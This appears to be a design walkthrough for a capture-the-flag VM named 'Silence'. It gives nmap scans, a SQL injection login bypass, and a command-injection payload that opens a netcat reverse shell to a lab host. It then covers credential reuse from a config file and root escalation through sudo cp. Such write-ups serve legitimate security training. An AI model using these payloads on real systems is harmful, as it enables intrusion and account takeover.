How to win at Silence
=====================

OVA
--------------------
When imported the network will need to be configured (host only seems easiest). Also the video memory needs to be bumped to 10 mb on Virtual Box.

Finding the box
--------------------
Use the following snipet to find the ip range for Vitual Box / VMWare
```
ifconfig | grep -B4 inet | grep -v '::'
```

Do a quick scan on the network with nmap
```
nmap -F -sV -sC 192.168.99.2-254
```

Getting shell as "psimon"
--------------------
There will be a login form for a webapp at http://silence/

### SQL Injection
There will be a SQL-injectable auth bypass in both the username and password fields. PoC with username = "a' OR 1=1;-- -"

Once logged-in there will be a command-injectable MP3 player playing Disturbed's cover of "The Sound of Silence".

### Command injection
User will need to set up a reverse shell to capture the command injection.
```
nc -l 1234
```

*Hint*: [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet]
The command injectable paramater is the peekAt:
```
`nc -n -e /bin/sh 192.168.213.1 1234`
```
(optional) Upgrade shell 
```
python -c 'import pty; pty.spawn("/bin/sh")'
bash
```
Once a shell has been obtained as www-data, a config file will show that the MySQL user for the app is "psimon" and the password is "here's2uMrs.R0bins0n". Perhaps with some comments saying:
> Dammit Paul stop using your password for application deployments! -Art
>
> What's the big deal? If they're in a position to read the config file it's already game-over. Besides, isn't your password mentioned in the git repo? ;) -Paul

Shell as psimon
--------------------
The password from the config will allow you able to "su" to or ssh in as "psimon". SSH is easier and results in a more usable shell.

This is where Flag1 is.

Getting shell as "agarfunkel"
--------------------
"psimon" will have a "id_rsa" in "~/.ssh". His ".bash_history" will be something like:
```
git clone ssh://git@stash.cudaops.com:7999/bnsec/${SOMETHING}
less ${SOMETHING}/INSTALL.md
su - agarfunkel
rm -rf ${SOMETHING}
```

It is possible to "git clone" the repo from stash. The repo will be a copy of the webapp installed at "/var/www". It will have an "INSTALL.md" that says something like "Log in as "agarfunkel" to be able to copy the app to "/var/www". His password is ${SOMETHING}"

It will then be possible to "su" to or "ssh" in as "agarfunkel".

Escalating from "agarfunkel" to root
--------------------
agarfunkel's ".bash_history" will be something like:
```
sudo cp -R /home/psimon/${SOMETHING}/*.php /var/www/
```

Doing "sudo -l" will show that he has (passwordless?) "sudo cp" privileges.

It will then be up to the imagination of the player to use such privilege to gain a root shell.
